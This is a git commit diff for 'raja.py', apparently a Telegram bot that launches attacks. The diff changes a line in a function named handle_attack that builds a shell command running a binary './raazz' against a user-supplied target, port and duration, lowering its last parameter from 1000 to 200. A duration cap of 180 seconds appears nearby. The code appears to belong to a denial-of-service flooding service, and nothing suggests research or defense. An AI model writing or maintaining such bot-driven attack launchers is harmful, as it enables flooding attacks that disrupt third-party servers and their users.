5e5d8c7c0702e78aecd5d70fb79a8b9dca1fb36b
Therk007 <tgvipkamisama@gmail.com>
2025-02-16 17:06:34 +0530

    Update raja.py

--- raja.py
+++ raja.py
@@ -139,7 +139,7 @@ def handle_attack(message):
         bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 𝟏8𝟎𝐬!**")
         return
 
-    full_command = f"./raazz {target} {port} {time_duration} 1000"
+    full_command = f"./raazz {target} {port} {time_duration} 200"
     random_image = random.choice(image_urls)
 
     bot.send_photo(message.chat.id, random_image, 
